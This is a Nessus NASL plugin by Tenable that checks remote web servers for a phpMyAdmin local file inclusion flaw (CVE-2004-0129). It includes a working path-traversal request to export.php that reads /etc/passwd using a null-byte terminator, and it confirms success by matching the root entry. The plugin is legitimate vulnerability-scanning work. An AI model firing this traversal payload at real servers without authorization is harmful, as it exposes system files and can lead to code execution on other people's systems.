#
# (C) Tenable Network Security
#

if(description)
{
 script_id(12041);
 script_cve_id("CVE-2004-0129");
 script_bugtraq_id(9564);
 if (defined_func("script_xref")) {
  script_xref(name:"OSVDB", value:"3800");
 }
 script_version ("$Revision: 1.8 $");
 
 name["english"] = "phpMyAdmin arbitrary file reading (2)";
 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis : 

The remote web server contains a PHP script that is affected by a
local file inclusion flaw. 

Description :

There is a bug in the remote version of phpMyAdmin that may allow an
attacker to read arbitrary files on the remote web server with the
privileges of the web user or even execute arbitrary PHP code. 
Successful exploitation of this issue requires that PHP's
'magic_quotes_gpc' setting be disabled. 

See also : 

http://archives.neohapsis.com/archives/bugtraq/2004-02/0062.html
http://sourceforge.net/forum/forum.php?forum_id=350228

Solution : 

Upgrade to phpMyAdmin version 2.4.6-rc1 or later.

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks phpMyAdmin";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 - 2006 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("phpMyAdmin_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  req = string(dir,"/export.php?what=../../../../../../../../../../etc/passwd%00");
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if( buf == NULL ) exit(0);

  if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
    security_warning(port);
    exit(0);
  }
}
